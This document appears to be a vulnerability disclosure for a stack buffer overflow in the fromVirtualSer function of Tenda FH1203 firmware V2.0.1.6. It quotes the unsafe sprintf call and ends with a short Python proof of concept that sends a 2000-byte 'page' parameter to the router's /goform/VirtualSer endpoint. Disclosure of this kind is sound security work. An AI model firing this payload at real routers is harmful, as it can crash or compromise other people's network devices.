# fromVirtualSer

## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details


There is a stack buffer overflow vulnerability in  FH1203 V2.0.1.6, located in the **fromVirtualSer** function. The function receives the `page` parameter from a POST request. `   sprintf(v5, "nat_virtualser.asp?page=%s", v3);` The statement will cause a buffer overflow. The `page` value provided by the user may exceed the capacity of the `v5` array, thereby triggering this security vulnerability.


![image](https://github.com/user-attachments/assets/2d880d75-b31c-44ef-afdd-3d0e9dcf2330)


## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/VirtualSer"
payload = b"a"*2000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image](https://github.com/user-attachments/assets/d9112a13-ae11-4ee5-9d4e-3c505053cf0a)
